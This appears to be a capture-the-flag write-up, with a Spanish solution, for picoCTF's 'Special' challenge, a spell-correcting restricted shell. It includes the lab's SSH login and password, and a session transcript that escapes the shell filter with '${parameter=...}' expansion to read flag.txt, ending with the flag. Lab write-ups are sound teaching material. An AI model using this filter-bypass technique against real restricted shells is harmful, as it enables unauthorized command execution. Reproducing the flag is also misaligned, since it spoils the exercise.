Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)
Start your instance to see connection details.`ssh -p 57013 ctf-player@saturn.picoctf.net`The password is `8a707622`

Hints:
1. Experiment with different shell syntax

## Solución 1:
Encontré que si agregábamos el comando como un parámetro dentro de '${p=}' lo ejecutaría normalmente, aunque con algunas restricciones
```
Special$ ${parameter=ls}
${parameter=ls}
blargh
Special$ ${parameter=cat blargh}
${parameter=cat blargh}
cat: blargh: Is a directory
Special$  ${parameter=ls blargh}
${parameter=ls blargh}
flag.txt
Special$ ${parameter=cat < blargh/flag.txt}
${parameter=cat < blargh/flag.txt}
cat: '<': No such file or directory
picoCTF{5p311ch3ck_15_7h3_w0r57_a60bdf40}
```
